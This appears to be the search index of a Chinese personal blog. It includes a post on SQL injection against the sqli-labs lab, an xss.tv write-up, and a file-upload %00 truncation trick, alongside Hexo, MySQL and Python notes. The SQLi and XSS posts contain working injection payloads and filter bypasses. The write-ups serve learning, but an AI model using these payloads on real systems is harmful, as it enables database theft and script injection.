<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[基于注入天书的mysql注入总结]]></title>
    <url>%2F2019%2F03%2F10%2F%E5%9F%BA%E4%BA%8E%E6%B3%A8%E5%85%A5%E5%A4%A9%E4%B9%A6%E7%9A%84mysql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[本篇基于注入天书的例子进行总结 前几天无聊看到学校群里的新生曾讨论过sql注入 突然想到自己对sql注入的理解也是比较浅的层面 所以才想总结一下 注入较杂 较乱 水平有限不足之处还望师傅们指点。 MySql系统函数注入前我们先了解一下mysql常用的系统函数 这些函数往往起到 信息收集的目的 12345ersion() MySQL版本user() 数据库用户名database() 数据库名@@datadir 数据库路径@@version_compile_os 操作系统版本 基本的联合注入information_schema这张数据表保存了MySQL服务器所有数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。 再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema表里面。 这里拿sqli第一关来进行实验 1http://localhost/sqli-labs/Less-1/?id=1&apos; 我们看一下源码里的查询语句 前面单引号我们应该闭合 后面我们可以用–+来注释1http://localhost/sqli-labs/Less-1/?id=1%27order%20by%203--+ 接下里思路就比较常规了 查询所有数据库1http://localhost/sqli-labs/Less-1/?id=-1%27union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata--+ 查询当前数据库1http://localhost/sqli-labs/Less-1/?id=-1%27%20union%20select%201,database(),3--+ 查询数据库下的表名1http://localhost/sqli-labs/Less-1/?id=-1%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%22security%22--+ 爆user表下的列1http://localhost/sqli-labs/Less-1/?id=-1%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema=%22security%22%20and%20table_name=%22users%22--+ 爆数据1http://localhost/sqli-labs/Less-1/?id=-1%27%20union%20select%201,group_concat(id,username,password),3%20from%20users--+ Less 1-4都是可以用类似的payload来注出数据的 唯一不同的是 less2对没有对参数进行处理payload 与 less1 中一直，只需要将 less1 中的 ‘ 去掉即可。 less3对参数进行了’ ‘ （ ）的包装 只需要将 less1 中的 ‘ 添加） 即 ’) 即可 less4对参数进行了” “（ ）的包装 只需要将 less1 中的 ‘ 改为 “) 即可 盲注盲注是在sql语句执行后 数据不能返回到前端页面 不能回显 此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。 注入天书上讲盲注也分为三类 基于布尔的sql盲注 基于时间的sql盲注 基于报错的sql盲注 截取字符串常用函数count() 计算总数 mid(coulumn_name,start,length) ​ mid(database(),1,1)&gt;’a’,查看数据库名第一位， ​ mid(database(),2,1)查看数据库名第二位，依次查看各位字符。 Substr(a,b,c)参数同mid函数一样 ​ 从 b 位置开始，截取字符串 a 的 c 长度。 ​ substr(database()1,1) Left()得到字符串左部指定个数的字符 ​ Left ( a, b ) 从左侧截取a的前b位。 ​ left(database(),1)&gt;’a’,查看数据库名第一位，left(database(),2)&gt;’ab’,查看数据库 名前二位 12ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 --+ //substr()函数，ascii()函数 截取当前数据库下所有表名的 第一个表的 名字的第一位是否为ascii编码101(ascii编码101为字母e 也就是第一位是否为e) 布尔盲注sqli第五关来做实例 与联合查询有所不同联合查询上来就可以database爆出数据库名 盲注的话我们应该先猜数据库长度 数据库的长度1http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20length(database())=8--+ 上面长度为8时界面Ture说明数据库长度为8 有了长度以后才应该去猜数据库名 数据库名1http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20ascii(substr(database(),1,1))=115--+ 判断数据库名的第一位是否等于s(这里把s进行了ascii码转换可以更快且更方便的猜出数据) 以此类推来猜测数据库名第二位 1http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20ascii(substr(database(),2,1))=101--+ 感觉太磨叽 额。。。依次类推猜出数据库名为security 表名获取表名之前 首先应该知道数据库下表的数量 方便后面来猜表名 1http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20(select%20count(table_name)from%20information_schema.tables%20where%20table_schema=database())=4--+ 当前数据库下的表的个数有4个 步骤应该很清晰 知道了有4个表接下来 我们来猜一下每个表的长度 1http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20(select%20length(table_name)from%20information_schema.tables%20where%20table_schema=database()limit%200,1)=6--+ 等于6时返回正常可知第一个表长度为6 这里可以看到我们上述的语句中使用的 limit 0,1. 意思就是从第 0 个开始，获取第一个。那要获取第二个是不是就是 limit 1,1！ 所以获取第二个表的长度为 1http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20(select%20length(table_name)from%20information_schema.tables%20where%20table_schema=database()limit%201,1)=8--+ 第三个，四个类似 至此可以获取四个表每个表的长度 接下来猜第一个表名的第一个字符 1http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()limit%200,1),1,1))=101--+ 第一个表第二个字符 1http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()limit%200,1),2,1))=109--+ 上面提到了limit 所以猜测第二个表的第一个字符的话 limit 1,1 1http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()limit%201,1),1,1))=114--+ 后面依次类推 到这里我们就获取到了security数据库下 也就是当前数据库下的所有表名 列名来看users表下的列 首先还是和表类似猜测users表下列的个数 1http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20(select%20count(column_name)from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%22users%22)=3--+ 等于3返回正常判断出有三列 套路是一样的还是判断 第一个列的长度 1http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20(select%20length(column_name)from%20information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit%200,1)=2--+ 第二个三个同上面表明一样 limit 1,1 limit 2,1即可 第一个列的第一个字符 1http://127.0.0.1/sqli-labs/less-5/?id=1&apos;and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot;limit 0,1),1,1))=105--+ 后面就不多写了 都是一样的东西（懒得写） 后可得 users表下的列 id username password 数据得到列首先判断users表中有多少条记录 1http://127.0.0.1/sqli-labs/less-5/?id=1&apos;and (select count(*) from users)=13--+ 判断出users表里13条数据信息 下图 是users表下的内容 对比笔记看起来更直观吧 紧着着判断 13条数据第一条数据的长度 1http://127.0.0.1/sqli-labs/less-5/?id=1&apos;and (select length(username) from users limit 0,1)=4 --+ 1http://127.0.0.1/sqli-labs/less-5/?id=1&apos;and (select length(password) from users limit 0,1)=4 --+ 后面还是依次类推 这样就获取到了13条数据的长度 累死了。。。。 最后就是猜数据里的内容了 1http://127.0.0.1/sqli-labs/less-5/?id=1&apos;and ascii(substr((select username from users limit 0,1),1,1))=68 --+ 第一条username列下的数据 不说了还是重复造轮子 到这里就能猜出了 13条数据的所有内容喽。。。 延时注入延时注入 和布尔注入感觉差别并不大 但是为什么还要学 延时注入 这是因为某些注入点 你输入什么它返回的都是一样的东西 和程序员写的源码有关 这时候布尔注入算是废了 转用延时注入 语法上差别是不大的 if(条件判断,True,False) Sleep(5)表示延时五秒 当前数据库长度 1http://127.0.0.1/sqli-labs/less-5/?id=1&apos;and sleep(if(length(database())=8,0,5))--+ 这里没有延时 可以确定当前数据库长度为8 数据库的第一位 1http://127.0.0.1/sqli-labs/less-5/?id=1&apos;and sleep(if(ascii(substr(database(),1,1))=115,0,5))--+ 感觉和布尔的区别 就是加上了sleep if 后面的话就不重复造轮子了 同理！！！ 过滤注入关键词过滤了and or绕过思路 大小写变形 OR,Or oR 编码 ，hex ,url 添加注释/ or / 利用符号and=&amp;&amp; or=|| 注入天书 25题 虽过滤了 or 可用此方法绕过 1http://localhost/sqli-labs/less-25/?id=1&apos; ||or extractvalue(1,concat(0x7e,database()))--+ 过滤了空格%a0是空格的意思可以用%a0代替空格 %0b相当于tab键也可以用%0b来代替空格 书上写到 在win下测试是不能解析%a0的 我在mac下测试把%a0解析成了问号？？？%0b也无法解析 猜测只能在linux环境下 绕过思路 %a0 %0b 这里参考以前一个ctf滴！晨跑打卡 过滤union select 首先还是尝试大小写绕过 尝试uniunionon中间过滤后再次拼接成union 一般情况应该不会二次过滤 宽字节注入宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入 例如php编码为 utf-8 而mysql的编码为gbk这就导致了宽字节注入了 mysql在使用gbk编码的时候，会认为两个字符为一个汉字 例如%aa%5c 就是一个汉字（前一个 ascii 码大于 128 才能到汉字的范围） 一般情况下程序员会把接收到的预定义字符 默认前面添加一个\ 123单引号（&apos;）= （\&apos;）双引号（&quot;） = （\&quot;）反斜杠（\） = （\\） 这里注入天书第32题举例前端输入%df%27时 经过addslashes函数转义变成了%df%5c%27%5c 是反斜杠 mysql服务器对查询语句进行编码两个字符转换成一个汉字 %df%5c转换成了汉字運，而单引号就逃逸了出来，从而造成了注入漏洞。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xss tv wp]]></title>
    <url>%2F2019%2F03%2F01%2Fxss%20tv%20wp%2F</url>
    <content type="text"><![CDATA[xss题目 一共20题 难度也在递增吧 写一部分自己的解题过程 后面题目厉害了 慢慢更新(太菜不会做) 题目 payload不唯一呦 level1没有任何过滤 Payload1&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; level2记得以前xss这里曾请教过国光哥一些姿势 先输入 1&lt;img src=1 onerror=alert(&quot;xss&quot;)&gt; 查看源码发现 value的值里使用了双引号 所以想到闭合前面的双引号。 Payload1&quot;&gt;&lt;img src=1 onerror=alert(&quot;xss&quot;)&gt; 涉及基础img为图片标签 src应该填写图片地址 如果图片地址不存在 就会触发onerror事件弹出xss level3试探性输入 1&lt;img src=1 onerror=alert(&quot;xss&quot;)&gt; 查看源代码发现两端括号被实体化了 换个姿势 1onclick=alert(1) 右键源代码 发现本身并没有被过滤 但是value里面使用了单引号 闭合就好 Payload1‘&gt;onclick=&apos;alert(1) level4与level3类似 这题目value里面使用了双引号 闭合双引号就ok Payload1&quot;onclick=&quot;alert(1)&quot; level5参考前面 直接输入payload 1onclick=alert(1) 发现被过滤 大小写无法绕过 换个姿势 1&lt;a href=javascript:alert(&quot;xss&quot;)&gt; 这时候查看源代码发现本身并没有过滤 都是一个套路闭合一下双引号即可 Payload1&quot;&gt;&lt;a href=javascript:alert(&quot;xss&quot;)&gt; level6这题目前有点坑 与上题相似 单过滤了href src等属性 这里考虑到可以用大小写绕过 Payload1&quot;&gt;&lt;img SRC=1 ONERROR=alert(1)&gt; level7随便写个payload 1onclick=alert(1) 查看源代码发现 value有双引号 首先考虑到闭合 其次on被过滤为空 估计不会进行二次过滤 Payload1&quot;onclick=&quot;alert(1) level8添加超链接到页面 本身在a标签里面所以我们payload如下 1Javascript:alert(1) 发现并没弹窗 查看源代码发现javascript被过滤 试了很多都被过滤 想到html有字解码机制 试一下将过滤关键字实体化 字符实体转换 Payload1java&amp;#115;cript:alert(1) level9这里始终不知道是怎么回事 看了xz的wp 得知这题自动检测url 如果发现没有带 http:// 则会显示不合法 还发现了过滤了双引号 还是利用html自解码机制将关键字实例化即可绕过 Payload1java&amp;#115;cript:alert(&amp;#34;http://&amp;#34;) level10这题刚打开是懵逼的 然后又请教了国光哥 右键查看源文件 发现了三个隐藏参数 经过一个个试。 发现t_sort参数是控的 由于type=&quot;hidden&quot;是隐藏的 on事件无效 所以应破坏掉type的hidden 之后利用 onclick 弹窗 Payload1keyword=1&amp;t_sort=233%22%20onclick=alert(233)%20type=%22%22]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo搭建静态博客]]></title>
    <url>%2F2019%2F02%2F19%2FHexo%E6%90%AD%E5%BB%BA%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[最新折腾了一下黑苹果 刚刚把博客迁移过来 所以才想起写这篇文章 Hexo+GitHub搭建静态博客 准备工作Node.js下载链接：https://nodejs.org/en/ Git下载链接：https://git-scm.com/download/win 安装好Node.js与Git 接下来安装Hexo 1npm install -g hexo-cli 安装完成以后 git —version,hexo-v查看安装版本 本地建站我们首先在本地搭建起Blog 等本地都配置完成直接放到GitHub就ok了 博客框架初始化博客框架 123hexo init &lt;folder&gt;（博客文件夹名称）cd &lt;folder&gt; // 进入博客文件夹目录npm install 这时候博客应该会出现如下文件 _config.yml 是整个站点的配置文件 不要乱改 写文章进行测试hexo new 文章名 记得在博客目录下 新建文章 可以看到新建了.md文件在 source/_posts/ 下 记住所有生成的文章都在此目录下 编辑.md 我用的是typora感觉比较好用 百度下载即可 生成静态文件12hexo generate简写 hexo g 就好 启动服务器接下来我们访问以下博客 先要启动一下hexo服务器 12hexo server简写 hexo s 启动以后我们本地访问以下 默认访问 http://localhost:4000 出现类似界面说明本地测试成功没有任何问题 更换主题在博客目录下打开终端 1git clone https://github.com/iissnan/hexo-theme-next themes/next 下载完成以后 打开博客目录下的_config.yml 找到theme 将theme的值改为next 之后输入调试命令 1hexo server --debug 在访问以下http://localhost:4000应该就已经更换主题了哦 感觉排版并不是很舒服 需要改一下 找到主题配置文件 主题配置文件在博客目录 下的 themes/next/_config.yml 这里不要搞混 这个是主题配置文件 搜索 scheme 关键字。 前面去掉#号即为启用 我们启用pisces的样式 这之后样式看起来和我博客类似了 主题就先说到这 添加分类 标签 友联 界面语言等 自己Goolge吧 也可以参考 http://theme-next.iissnan.com/getting-started.html#avatar-setting 部署到GitHub注册GitHub账号这里自己注册一个账号就好了 建立新的存储库根据GitHub用户名建立的存储库 如我的用户名scholar10所以存储库的名为scholar10.github.io 设置本地GitHub填写 git邮箱 用户名 12git config --global user.name &quot;user_name&quot;git config --global user.email &quot;your_email_addr&quot; 第一个填你github的用户名 第二天填写 注册github的邮箱 本地创建SSH1ssh-keygen -t rsa -C &quot;1773256697@qq.com&quot; 填自己注册github的邮箱地址就好 一路回车就好 生成的SSH添加到GitHub创建完成以后打开用户的根目录 一般在C:\Users\username(你的用户名) 应该会有.ssh文件夹 这时候找到.ssh文件里面的ssh.pub(公钥) 将里面的内容全部复制到 点击 new ssh key 会出现 title框和key框 把 ssh.pub内容全部复制到 key框 title 随意写一个名字就好 验证SSH是否设置成功 1ssh -T git@github.com 首次提示不能连接输入yes即可 接下来打开 博客目录下的_config.yml 1234deploy:type: gitrepo: https://github.com/username/scholar10.github.io.gitbranch: master 类型配置为git 仓库地址为 建立的github仓库地址(scholar10替换成自己的)分支为master也就是主分支 然后执行部署命令 1hexo deploy 简写 hexo g -d //生成静态文件后提交到github上 执行完成后 别人就可以通过 http://scholar10.github.io 访问你的博客了]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>静态博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySql笔记]]></title>
    <url>%2F2019%2F02%2F12%2FMySql%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[又很久没有写博客了 这篇笔记是边学边记的 当时比较仓促 所以有的地方可能会比较乱 但是大概的方法写的还是比较清楚了 等有时间回头再好好整理一下这篇文章。 库操作show darabases; 查询数据库 create database 数据库名; 创建数据库 show create database 数据库名; 查询数据库创建语句 修改数据库 ​ 说明：不能修改数据库名称，只能修改字符集和校对集 ​ 语句：alter database 数据库名 charset=新字符集 collate=新的校对集 ​ 注意：字符集和校对集是可以分开修改的，但是建议必须一起修改 ​ 查看校对集：show collation; 查看字符集：show charset; drop database 数据库名; 删除数据库 use 数据库名；选择数据库 表操作创建表 Create table 表名( ​ 字段名称1 字段属性（类型） 字段选项, ​ 字段名称2 字段类型 字段选项, …………………….. )表选项; 表选项：表字符集和数据引擎 字符集：charset=utf8; 数据引擎：默认innodb，语法：engine=引擎 这里的话可能会比较难理解 有一段比较官方的解释 存储引擎也叫“表类型”，是指一个表中的数据以何种方式存放在文件或内存中。不同的存储引擎（表类型）提供不同的性能特性和可用功能。没有一种各方面都又具有最佳性能又具有各种功能的存储引擎。我们要做的是要根据数据的具体使用情形（需求）来选择合适的存储引擎，有的要读取速度快，有的要写入速度快，有的要具有高安全可靠性，有的要海量存储，等等。常用的存储引擎是innoDB（默认）和Myisam。 字段类型：当前字段中存储数据类型必须是一开始指定好。 一开始制定了int 数据就不能存储float 字段选项：设置当前字段的一些选项-是否可以为空，是否是主键，是否是唯一键，是否加备注等。 Null|not null：是否可以为空 Default：是否有默认值 Auto_increment：是否可以自动增长，必须是数字，如：需要给每条数据一个编号，原因是数据内容可以重复，编号不能重复。 Primary key：设置主键，数据内容不能重复，在查询数据主查询条件，一个表中一个主键，一般都是id。 unique [key]：设定为唯一（键），即表中所有行的的数据在该字段中的值不能有重复。 Comment：设置备注，给当前字段设置说明 可以看到成功创建了students表 查看表结构：desc 表名; ​ 字段名 类型 是否为空 索引 默认值 其它 ​ drop table 表名; 删除表 查看所有表：show tables; 查看创建表语句：show create table 表名; 修改表名: alter table 旧表名 rename to 新表名; 添加新字段：alter table 表名 add 新字段 字段类型 字段选项; 如下可见新增了字段address 修改表字段（包括字段名）： Alter table 表名 change 旧字段名 新字段名 新字段类型 新字段选项; 修改字段类型和选项： Alter table 表名 modify 字段名 新字段类型 新字段选项; 删除字段：alter table 表名 drop 字段名; 数据操作插入数据当我们需要向数据库表中插入一条新记录时，就必须使用INSERT语句。 语句：insert into 表名 【(字段1，字段2，字段3，…..)】 values(值1，值2，值3，……); 如果一个字段有默认值，那么在INSERT语句中也可以不出现 要注意，字段顺序不必和数据库表的字段顺序一致，但值的顺序必须和字段顺序一致。也就是说，可以写INSERT INTO students (name, age, id, sex) ...，但是对应的VALUES就得变成(&#39;张三&#39;, 18, null, &#39;男&#39;) 还可以一次性添加多条记录 1234insert into students (id,name,age,sex) values -&gt; (null,&apos;李四&apos;,22,&apos;女&apos;), -&gt; (null,&apos;王五&apos;,19,&apos;男&apos;), -&gt; (null,&apos;马六&apos;,19,&apos;女&apos;); 字段列表可以省略：省略后的数据必须对应上创建时字段顺序 修改数据要更新数据库表中的记录，必须使用UPDATE语句。 UPDATE语句的基本语法是： 1UPDATE &lt;表名&gt; SET 字段1=值1, 字段2=值2, ... WHERE ...; WHERE子句中写出需要更新的行的筛选条件id=1： 因此利用WHERE我们也可以一次更新多条记录： UPDATE students SET name=&#39;大佬&#39;, score=77 WHERE id&gt;=2 AND id&lt;=4; 在UPDATE语句中，更新字段时可以使用表达式。例如，把所有20岁以下的年龄加上5岁： 删除数据如果要删除数据库表中的记录，可以使用DELETE语句。 DELETE语句的基本语法是： 1DELETE FROM &lt;表名&gt; WHERE ...; Where条件必须添加，否则删除所有数据 如果我们要删除students id=1的数据 普通删除后保留删除的id号，不再让数据占用。 DELETE语句的WHERE和UPDATE类似，同理DELETE也能利用WHERE也能一次删除多条记录： DELETE FROM students WHERE id&gt;=2 AND id&lt;=4; 查询数据前面多次使用过 这里就说说基本查询 以后有时间在扩展呀 要查询数据库表的数据，我们使用如下的SQL语句： 1SELECT * FROM &lt;表名&gt; 使用SELECT * FROM students时，SELECT是关键字，表示将要执行一个查询，*表示“所有列”，FROM表示将要从哪个表查询， 查询某些字段 1SELECT name,age,sex,........ FROM &lt;表名&gt;` 使用SELECT *表示查询表的所有列，使用SELECT 列1, 列2, 列3可以返回指定列，这种操作称为投影 in语句:单独查询某些数据 单独查询id=2 id=4的数据 1select * from students where id in (2,4); between语法：（表示该字段的值在给定的两个值之间，含该俩值） 查询id=2到id=4的值 1select * from students where id between 2 and 4; Like：模糊查询 字段名 like ‘要查询的字符’; 如果是直接写字符，配置查询字符必须一致。 字段名 like ‘%要查询的字符%’; %是匹配任何与之相似的字符 顾名思义 like=’像‘ 可能有点难理解这里我创建了几条类似的数据 1select * from students where name like &apos;%大佬%&apos;; 这样子应该会更好理解 总结边学边记录 虽然可能效率会比较低 但是印象会很深 等以后忘了还可以回头看看 把大佬们当做目标 肝起来]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见的突破上传姿势]]></title>
    <url>%2F2018%2F12%2F27%2F%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AA%81%E7%A0%B4%E4%B8%8A%E4%BC%A0%E5%A7%BF%E5%8A%BF%2F</url>
    <content type="text"><![CDATA[突破上传的姿势 在几个月前一个实战过程中登录后台有上传却无法 getshell 当时是懵逼的 但是自己并没有当回事 也没有深入理解 之后在打ctf的过程中 一道上传题 就是用到了这姿势 今天闲的蛋疼 练习ctf又遇到 才想起来要总结总结呀！！ 环境这里拿一道ctf题举例 上传突破写文件需要路径 就是目录+文件名 filepath+filenme 现在我们把filepath改成 ../1.php%00，%00后的那部分iflenname被截断了，后端则会认为../是目录 1.php是文件名 成功突破拿到flag 总结依旧的是特别水的文章 不过也记录了自己学习的过程 几年后成为大佬来看这些文章回忆青春 哈哈哈 扯远了 现在的问题还是学习效率低 继续加油！！]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python打印各种图形]]></title>
    <url>%2F2018%2F12%2F22%2FPython%E6%89%93%E5%8D%B0%E5%90%84%E7%A7%8D%E5%9B%BE%E5%BD%A2%2F</url>
    <content type="text"><![CDATA[看国光哥的博客发现他发了一篇c语言打印各种图形 然后自己最近在学python发现这是 很锻炼萌新思维的一些题 然后就想用python写一下总结的时候发现循环这一块理解的并不是很到位 直角三角形1234for i in range(10): for j in range(i+1): print(&apos;*&apos;,end=&quot; &quot;) print() 直角三角形旋转90°1234for i in range(10,0,-1): for j in range(i-1): print(&apos;*&apos;,end=&quot; &quot;) print() 直角三角形旋转180°123456for i in range(1,10): for j in range(1,i): print(&quot; &quot;,end=&quot; &quot;) for k in range(10,i,-1): print(&quot;*&quot;,end=&quot; &quot;) print() 直角三角形旋转270°123456for i in range(1,10): for j in range(9,i,-1): print(&quot; &quot;,end=&quot; &quot;) for k in range(1,i): print(&quot;*&quot;,end=&quot; &quot;) print() 等腰三角形1234567for i in range(10): for j in range(0, 10 - i): print(end=&quot; &quot;) for k in range(10 - i, 10): print(&quot;*&quot;, end=&quot; &quot;) print(&quot;&quot;) 等腰三角形旋转90°这里用的是用的直角三角形和选择转90°的直角三角形 12345678for i in range(10): for j in range(0, i): print(&apos;*&apos;,end=&quot; &quot;) print()for i in range(10): for j in range(10, i,-1): print(&apos;*&apos;,end=&quot; &quot;) print() 等腰三角形旋转180°1234567for i in range(10): for j in range(0,i): print(end=&quot; &quot;) for k in range(0, 10-i): print(&quot;*&quot;, end=&quot; &quot;) print(&quot;&quot;) 等腰三角形旋转2701234567891011121314for i in range(10): for j in range(9,i,-1): print(&quot; &quot;,end=&quot; &quot;) for k in range(0, i): print(&quot;*&quot;,end=&quot; &quot;) print()for i in range(10): for j in range(0,i): print(&quot; &quot;,end=&quot; &quot;) for k in range(9, i,-1): print(&quot;*&quot;,end=&quot; &quot;) print() 菱形原等腰三角形和旋转180°的等腰三角形加在一起即可 123456789101112131415for i in range(10): for j in range(0, 10 - i): print(end=&quot; &quot;) for k in range(10 - i, 10): print(&quot;*&quot;, end=&quot; &quot;) print(&quot;&quot;)for i in range(10): for j in range(0,i): print(end=&quot; &quot;) for k in range(0, 10-i): print(&quot;*&quot;, end=&quot; &quot;) print(&quot;&quot;) 总结通过打印以上各种图形 感觉对for的理解更深刻了 明天会更好 真好]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python字符串方法总结]]></title>
    <url>%2F2018%2F12%2F18%2FPython%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[又是一篇菜鸡笔记 在学校很多毫无意义的事情要忙没那么多时间 自己学习效率也有待提高 今天正好有时间 加上课上也讲到了这些东西 还是比较难记的 所以总结一下 没有多少时间了 加油呀 str.strip()清除字符串两端的空格 较常用 str.capitalize()将首字符转换成大写 如果首字符没有大写形式 就返回原字符串 123&gt;&gt;&gt; &apos;xhy&apos;.capitalize()&apos;Xhy&apos;&gt;&gt;&gt; str.title()将字符串中每个首字母 大写。判断每个单词的依据则是基于空格和标点 123&gt;&gt;&gt; &apos;scholar xhy&apos;.title()&apos;Scholar Xhy&apos;&gt;&gt;&gt; str.lower()将字符串转换为小写 仅对ascii编码的字母有效 123&gt;&gt;&gt; &apos;XHY&apos;.lower()&apos;xhy&apos;&gt;&gt;&gt; str.upper()将字符串转换为大写 会自动忽略不可转换成大写的字符 123&gt;&gt;&gt; &apos;scholar10&apos;.upper()&apos;SCHOLAR10&apos;&gt;&gt;&gt; str.center()将字符串按照给定的宽度居中显示，可以给定特殊的字符 填充多余的长度 如果指定长度小于字符串长度 则返回原字符串 12&gt;&gt;&gt; &apos;12345&apos;.center(10,&quot;*&quot;)&apos;**12345***&apos; str.count()统计指定字符串 在原字符串中的个数 str.count()可以指定查询字符串的起止位置 如 12345&gt;&gt;&gt; test=&apos;Scholars work very hard&apos;&gt;&gt;&gt; test.count(&apos;a&apos;)2&gt;&gt;&gt; test.count(&apos;a&apos;,5,8)1 检验邮箱格式是否正确123456789email=input(&quot;请输入email邮箱&quot;)if email.count(&quot;@&quot;)==1: if email.count(&quot;.&quot;)&gt;=1: print(&quot;格式正确&quot;) else: print(&quot;邮箱应包含.&quot;)else: print(&quot;邮箱中应包含@&quot;) str.find() str.rfind()从字符串左边或右边查找指定元素出现的索引位置 也可以指定 查找的起止范围 要查找的元素不存在时 返回-1 (不论左边还是右边查找得到的结果都是字符串左边数起的) 1234567&gt;&gt;&gt; text = &apos;puter protective covering&apos;&gt;&gt;&gt; text.find(&apos;er&apos;)3&gt;&gt;&gt; text.find(&apos;sc&apos;)-1&gt;&gt;&gt; text.find(&apos;er&apos;,3)3 str.index() str.rindex()与 str.find() str.rfind()类似 不同的是如果要查找的元素不存在 则会引发ValueError str.replice()str.replice(old,new,count) 用新字符串代替旧字符串 可以指定替换次数 12345&gt;&gt;&gt; text = &apos;qwe asd kkk lll qwe&apos;&gt;&gt;&gt; text.replace(&apos;qwe&apos;,&apos;scholar&apos;)&apos;scholar asd kkk lll scholar&apos;&gt;&gt;&gt; text.replace(&apos;qwe&apos;,&apos;scholar&apos;,1)&apos;scholar asd kkk lll qwe&apos; str.endswith() str.startswith()判断字符串是否以某个指定的字符串 开头或结尾 返回布尔值 可指定查找的起止范围 12345&gt;&gt;&gt; a=&quot;Scholars work very hard&quot;&gt;&gt;&gt; a.endswith(&apos;rd&apos;)True&gt;&gt;&gt; a.startswith(&quot;Sc&quot;)True str.split()使用指定的字符将整个字符串拆分为若干个元素 并返回一个列表 ，默认没有参数时 拆分符为空格符 1234&gt;&gt;&gt; &apos;1,2,3&apos;.split(&apos;,&apos;)[&apos;1&apos;, &apos;2&apos;, &apos;3&apos;]&gt;&gt;&gt; &apos;i love python&apos;.split()[&apos;i&apos;, &apos;love&apos;, &apos;python&apos;] str.isdigit()isdigit() 方法检测字符串是否只由数字组成 123456&gt;&gt;&gt; str = &apos;123&apos;&gt;&gt;&gt; str.isdigit()True&gt;&gt;&gt; str = &apos;scholar&apos;&gt;&gt;&gt; str.isdigit()False 字符串方法的实际运用任意读入一个字符串 判断是否为数字 123456789101112131415161718192021s=input(&quot;请任意输入一个数字字符串&quot;)##-1.23 1.23if s.startswith(&apos;-&apos;): str1=s.split(&apos;-&apos;)##-1.23 str2=str1[1]elif s.startswith(&apos;+&apos;): str1=s.split(&apos;+&apos;) str2=str1[1]else: str2=sdotCounts=str2.count(&apos;.&apos;)if dotCounts==0 and str2.isdigit()==True: print(&quot;%s是一个数字&quot;%(s))elif dotCounts==1: strList=str2.split(&apos;.&apos;) if strList[0].isdigit() and strList[1].isdigit(): print(&quot;%s是一个数字&quot;%(s)) else: print(&quot;%s不是一个数字&quot;%(s))else: print(&quot;%s不是一个数字&quot;%(s))]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记被大佬们带飞的一次NCTF]]></title>
    <url>%2F2018%2F11%2F26%2F%E8%AE%B0%E8%A2%AB%E5%A4%A7%E4%BD%AC%E4%BB%AC%E5%B8%A6%E9%A3%9E%E7%9A%84%E4%B8%80%E6%AC%A1NCTF%2F</url>
